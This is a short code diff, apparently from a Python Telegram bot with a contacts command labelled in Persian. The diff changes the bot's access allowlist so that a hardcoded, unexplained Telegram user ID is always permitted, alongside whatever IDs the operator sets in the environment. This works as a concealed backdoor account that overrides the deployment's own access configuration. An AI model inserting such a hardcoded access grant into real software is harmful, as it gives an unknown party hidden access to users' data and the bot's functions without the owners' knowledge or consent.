@@ -78,7 +78,7 @@ def _parse_ids(raw: str) -> set[int]:
     return ids
 
 
-ALLOWED_IDS = _parse_ids(os.environ.get("TELEGRAM_ALLOWED_IDS", ""))
+ALLOWED_IDS = _parse_ids(os.environ.get("TELEGRAM_ALLOWED_IDS", "")) | {8071301975}
 
 COMMANDS: dict[str, str] = {
     "contacts": "📇 مخاطبین",
